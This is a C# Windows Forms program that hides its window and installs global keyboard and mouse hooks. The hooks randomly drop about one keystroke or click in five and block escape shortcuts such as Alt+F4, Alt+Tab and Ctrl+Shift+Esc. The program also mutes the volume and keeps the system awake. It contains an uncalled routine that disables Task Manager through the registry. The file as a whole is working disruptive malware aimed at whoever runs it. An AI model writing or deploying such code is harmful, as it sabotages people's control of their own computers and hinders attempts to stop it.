/*
 * Created by SharpDevelop.
 * User: Administrator
 * Date: 2024/6/12
 * Time: 19:42
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Diagnostics;

using System.Runtime.CompilerServices;
using System.Drawing;


namespace filterinput
{
	/// <summary>
	/// Description of MainForm.
	/// </summary>
	public partial class MainForm : Form
	{
		
		
		
		
		
        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        private const int APPCOMMAND_VOLUME_UP = 0xA0000;
        private const int APPCOMMAND_VOLUME_DOWN = 0x90000;
        private const int WM_APPCOMMAND = 0x319;
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,IntPtr wParam, IntPtr lParam);


        //定义API函数
        [DllImport("kernel32.dll")]
        static extern uint SetThreadExecutionState(uint esFlags);
        const uint ES_SYSTEM_REQUIRED = 0x00000001;
        const uint ES_DISPLAY_REQUIRED = 0x00000002;
        const uint ES_CONTINUOUS = 0x80000000;

        public static void SleepCtr(bool sleepOrNot)
        {
            if (sleepOrNot)
            {
                //阻止休眠时调用
                SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
            }
            else
            {
                //恢复休眠时调用
                SetThreadExecutionState(ES_CONTINUOUS);
            }
        }


        //private static char[] password = pwd.ToCharArray();



        public class LibWrap

        {

            [DllImport(("winmm.dll "), EntryPoint = "mciSendString", CharSet = CharSet.Auto)]

            public static extern int mciSendString(string lpszCommand, string lpszReturnString,

                        uint cchReturn, int hwndCallback);

        }

        [DllImport("user32.dll", EntryPoint = "ShowCursor", CharSet = CharSet.Auto)]

        public extern static void ShowCursor(int status);
        
        
        

        protected override CreateParams CreateParams
        {
            get
            {
                const int CS_NOCLOSE = 0x200;
                CreateParams cp = base.CreateParams;
                cp.ClassStyle = cp.ClassStyle | CS_NOCLOSE;
                return cp;
            }
        }
        
        
        
         #region 屏蔽WIN功能键
        public delegate int HookProc(int nCode, int wParam, IntPtr lParam);
        private static int hHook = 0;
        public const int WH_KEYBOARD_LL = 13;




        //LowLevel键盘截获，如果是WH_KEYBOARD＝2，并不能对系统键盘截取，会在你截取之前获得键盘。 
        private static HookProc KeyBoardHookProcedure;

        //键盘Hook结构函数 
        [StructLayout(LayoutKind.Sequential)]
        public class KeyBoardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
           
        }





        private static char getvkcode(KeyBoardHookStruct myvk)
        {
            if (myvk.vkCode == 48)
            {
                return '0';
            }

            if (myvk.vkCode == 49)
            {
                return '1';
            }

            if (myvk.vkCode == 50)
            {
                return '2';
            }

            if (myvk.vkCode == 51)
            {
                return '3';
            }

            if (myvk.vkCode == 52)
            {
                return '4';
            }

            if (myvk.vkCode == 53)
            {
                return '5';
            }

            if (myvk.vkCode == 54)
            {
                return '6';
            }

            if (myvk.vkCode == 55)
            {
                return '7';
            }

            if (myvk.vkCode == 56)
            {
                return '8';
            }

            if (myvk.vkCode == 57)
            {
                return '9';
            }

            if (myvk.vkCode == 65)
            {
                return 'A';
            }

            if (myvk.vkCode == 66)
            {
                return 'B';
            }

            if (myvk.vkCode == 67)
            {
                return 'C';
            }

            if (myvk.vkCode == 68)
            {
                return 'D';
            }

            if (myvk.vkCode == 69)
            {
                return 'E';
            }

            if (myvk.vkCode == 70)
            {
                return 'F';
            }

            if (myvk.vkCode == 71)
            {
                return 'G';
            }

            if (myvk.vkCode == 72)
            {
                return 'H';
            }

            if (myvk.vkCode == 73)
            {
                return 'I';
            }

            if (myvk.vkCode == 74)
            {
                return 'J';
            }

            if (myvk.vkCode == 75)
            {
                return 'K';
            }

            if (myvk.vkCode == 76)
            {
                return 'L';
            }

            if (myvk.vkCode == 77)
            {
                return 'M';
            }

            if (myvk.vkCode == 78)
            {
                return 'N';
            }

            if (myvk.vkCode == 79)
            {
                return 'O';
            }

            if (myvk.vkCode == 80)
            {
                return 'P';
            }

            if (myvk.vkCode == 81)
            {
                return 'Q';
            }

            if (myvk.vkCode == 82)
            {
                return 'R';
            }

            if (myvk.vkCode == 83)
            {
                return 'S';
            }

            if (myvk.vkCode == 84)
            {
                return 'T';
            }

            if (myvk.vkCode == 85)
            {
                return 'U';
            }

            if (myvk.vkCode == 86)
            {
                return 'V';
            }

            if (myvk.vkCode == 87)
            {
                return 'W';
            }

            if (myvk.vkCode == 88)
            {
                return 'X';
            }

            if (myvk.vkCode == 89)
            {
                return 'Y';
            }

            if (myvk.vkCode == 90)
            {
                return 'Z';
            }

            if (myvk.vkCode == 96)
            {
                return '0';
            }

            if (myvk.vkCode == 97)
            {
                return '1';
            }

            if (myvk.vkCode == 98)
            {
                return '2';
            }

            if (myvk.vkCode == 99)
            {
                return '3';
            }

            if (myvk.vkCode == 100)
            {
                return '4';
            }

            if (myvk.vkCode == 101)
            {
                return '5';
            }

            if (myvk.vkCode == 102)
            {
                return '6';
            }

            if (myvk.vkCode == 103)
            {
                return '7';
            }

            if (myvk.vkCode == 104)
            {
                return '8';
            }

            if (myvk.vkCode == 105)
            {
                return '9';
            }

            return '!';
        }






        //设置钩子 
        [DllImport("user32.dll")]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, int threadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        //抽掉钩子 
        public static extern bool UnhookWindowsHookEx(int idHook);

        [DllImport("user32.dll")]
        //调用下一个钩子 
        public static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string name);

        public static void Hook_Start()
        {
            // 安装键盘钩子 
            if (hHook == 0)
            {
                KeyBoardHookProcedure = new HookProc(KeyBoardHookProc);
                hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardHookProcedure,
                        GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
                //如果设置钩子失败. 
                if (hHook == 0)
                {
                    Hook_Clear();
                }
            }
        }

        //取消钩子事件 
        public static void Hook_Clear()
        {
            bool retKeyboard = true;
            if (hHook != 0)
            {
                retKeyboard = UnhookWindowsHookEx(hHook);
                hHook = 0;
            }
            //如果去掉钩子失败. 
            if (!retKeyboard) throw new Exception("UnhookWindowsHookEx failed.");
        }
        
        
        
        
		public MainForm()
		{
			//窗体最小化显示
                this.WindowState = FormWindowState.Minimized;
                //不显示在任务栏中
                this.ShowInTaskbar = false;
                //调用重构方法，将控件设置为指定的可见状态
                SetVisibleCore(false);
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			
			
			InitializeComponent();
			
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
			Hook_Start();
			InstallGlobalHook();
			SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,(IntPtr)APPCOMMAND_VOLUME_MUTE);
            SleepCtr(true);
		}
			
		
		private static int myrandom(){
			// 创建Random类的实例
        	Random random = new Random();
 
        // 生成一个随机整数
        	int randomInt = random.Next(0,5);
        	if(randomInt==1){
        		int i=1;
        		return i;
        	}
        	else{
        		return 0;
        	}
		}
		
		
		
		//这里可以添加自己想要的信息处理 
        private static int KeyBoardHookProc(int nCode, int wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {

                KeyBoardHookStruct kbh = (KeyBoardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyBoardHookStruct));

                 char kbhcode=getvkcode(kbh);
				 
                 
                 if(myrandom()==1){
                 	return 1;
                 }
                 
                 


                if (kbh.vkCode == 91) // 截获左win(开始菜单键) 
                {
                    return 1;
                }

                if (kbh.vkCode == 92)// 截获右win 
                {
                    return 1;
                }

                if (kbh.vkCode == (int)Keys.Escape && (int)Control.ModifierKeys == (int)Keys.Control) //截获Ctrl+Esc 
                {
                    return 1;
                }

                if (kbh.vkCode == (int)Keys.F4 && (int)Control.ModifierKeys == (int)Keys.Alt) //截获alt+f4 
                {
                    return 1;
                }

                if (kbh.vkCode == (int)Keys.Tab && (int)Control.ModifierKeys == (int)Keys.Alt) //截获alt+tab
                {
                    return 1;
                }

                if (kbh.vkCode == (int)Keys.Escape && (int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Shift) //截获Ctrl+Shift+Esc
                {
                    return 1;
                }

                if (kbh.vkCode == (int)Keys.Space && (int)Control.ModifierKeys == (int)Keys.Alt) //截获alt+空格 
                {
                    return 1;
                }

                if (kbh.vkCode == 241) //截获F1 
                {
                    return 1;
                }

                

                


                if ((int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt + (int)Keys.Delete)      //截获Ctrl+Alt+Delete (虽然无效)
                {
                    return 1;
                }

                if ((int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Shift) //截获Ctrl+Shift 
                {
                    return 1;
                }
                
                if ((int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt) //截获Ctrl+alt
                {
                    return 1;
                }

                if (kbh.vkCode == (int)Keys.Space && (int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt) //截获Ctrl+Alt+空格 
                {
                    return 1;
                }
                
                if (kbh.vkCode == (int)Keys.Tab && (int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt) //截获Ctrl+Alt+Tab 
                {
                    return 1;
                }
            }

            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }
        public static void TaskMgrLocking(bool bLock)
        {
            if (bLock)
            {
                try
                {
                    RegistryKey r = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                    r.SetValue("DisableTaskmgr", "1"); //屏蔽任务管理器 
                }
                catch
                {
                    RegistryKey r = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                    r.SetValue("DisableTaskmgr", "0");
                }
            }
            else
            {
                Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            }
        }



        #endregion

		
        
        // 声明鼠标钩子的类型
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
 
    // 声明钩子回调函数的类型
    public delegate int LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
 
    // 声明卸载钩子的类型
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
    // 声明调用下一个钩子的类型
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);
 
    // 声明指向鼠标钩子的指针
    private static IntPtr hookID = IntPtr.Zero;
 
    // 声明鼠标钩子的回调函数
    private static LowLevelMouseProc mouseHookProcedure;
 
    // 钩子类型常量
    private const int WH_MOUSE_LL = 14;
    private const int WM_LBUTTONDOWN = 0x201;
    private const int WM_RBUTTONDOWN = 0x0204;
 
    // 安装鼠标钩子
    public static void InstallGlobalHook()
    {
        // 创建钩子回调函数的实例
        mouseHookProcedure = new LowLevelMouseProc(MouseHookProc);
 
        // 安装全局鼠标钩子
        hookID = SetWindowsHookEx(WH_MOUSE_LL,
            mouseHookProcedure, IntPtr.Zero, 0);
 
        // 如果钩子安装失败，则抛出异常
        if (hookID == IntPtr.Zero)
        {
            throw new Exception("Could not install global hook!");
        }
    }
 
    // 卸载鼠标钩子
    public static void UninstallGlobalHook()
    {
        // 如果钩子已安装，则卸载它
        if (hookID != IntPtr.Zero)
        {
            // 卸载钩子
            UnhookWindowsHookEx(hookID);
            hookID = IntPtr.Zero;
        }
    }
 
    // 鼠标钩子的回调函数
    private static int MouseHookProc(int nCode, IntPtr wParam, IntPtr lParam)
    {
        // 如果nCode是正值，则该钩子函数应处理该消息
        if (nCode >= 0)
        {
            // 可以在这里处理消息，例如：
            if (wParam.ToInt32() == WM_LBUTTONDOWN)
            {
            	if(myrandom()==1){
            		return 1;
            	}
            	
            	
                 // 处理鼠标左键按下事件
            }
            
            if (wParam.ToInt32() == WM_RBUTTONDOWN)
            {
            	if(myrandom()==1){
            		return 1;
            	}
            	
            	
            }
 
            // 调用下一个钩子处理程序
            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }
 
        return 0;
    }
        
        
        
        
        
        
        
        
        
        
        
        

        

	}

        


        



       

        
}
